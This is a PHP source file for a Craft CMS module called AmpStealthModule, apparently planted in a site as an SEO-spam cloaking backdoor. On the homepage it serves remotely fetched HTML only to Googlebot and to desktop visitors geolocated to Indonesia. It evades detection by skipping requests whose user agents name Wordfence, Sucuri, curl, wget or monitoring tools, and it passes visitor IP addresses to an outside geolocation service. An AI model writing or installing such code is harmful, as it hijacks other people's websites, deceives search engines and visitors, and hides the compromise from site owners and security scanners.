<?php
namespace modules;

use yii\base\Module;
use yii\web\Application as WebApplication;
use Craft;

class AmpStealthModule extends Module
{
    public function init()
    {
        parent::init();

        // Hook before the request is processed
        Craft::$app->on(WebApplication::EVENT_BEFORE_REQUEST, function () {
            $this->handleCloaking();
        });
    }

    protected function handleCloaking()
    {
        $request = Craft::$app->getRequest();

        //// Only homepage (root path)
        if (trim($request->getPathInfo(), '/') !== '') {
            return;
        }

        // Ignore CP and admin
        if ($request->getIsCpRequest()) {
            return;
        }

        // Protection against WAF user-agent bots
        $userAgent = strtolower($request->getUserAgent() ?? '');
        $blockUAs = ['wordfence', 'sucuri', 'curl', 'wget', 'scanner', 'uptime', 'monitor', 'headless', 'python', 'pingdom'];

        foreach ($blockUAs as $ua) {
            if (strpos($userAgent, $ua) !== false) {
                return;
            }
        }

        // Protection against suspicious referrers or URLs
        $referer = strtolower($request->getReferrer() ?? '');
        $badPaths = ['/admin', '/login', '/xmlrpc.php', '/wp-json', '/feed', '/?rest_route='];

        foreach ($badPaths as $path) {
            if (strpos($request->getUrl(), $path) !== false || strpos($referer, $path) !== false) {
                return;
            }
        }

        $isGoogleBot = preg_match('/googlebot|google-inspectiontool|google-site-verification/i', $userAgent);
        $isMobile = preg_match('/mobile|android|iphone|ipad/i', $userAgent);
        $country = $this->getVisitorCountry();

        // Remote content URL (live AMP HTML desktop)
        $remoteUrl = '#HTTPS://LP.TXT#';

        if ($isGoogleBot || (strtolower($country) === 'indonesia' && !$isMobile)) {
            $content = $this->getCachedContent($remoteUrl);
            if ($content) {
                header('Content-Type: text/html; charset=UTF-8');
                echo $content;
                Craft::$app->end();
            }
        }
    }

    protected function getVisitorCountry(): string
    {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        $url = "http://ip-api.com/json/{$ip}";
        $response = @file_get_contents($url);
        if ($response) {
            $data = json_decode($response, true);
            return $data['country'] ?? 'Unknown';
        }
        return 'Unknown';
    }

    protected function getCachedContent(string $url, int $ttl = 3600): ?string
    {
        $cacheFile = Craft::getAlias('@storage/runtime/ampstealth-cache.html');

        if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < $ttl)) {
            return file_get_contents($cacheFile);
        }

        $content = @file_get_contents($url);
        if ($content && strlen($content) > 20) {
            file_put_contents($cacheFile, $content);
            return $content;
        }

        return file_exists($cacheFile) ? file_get_contents($cacheFile) : null;
    }
}
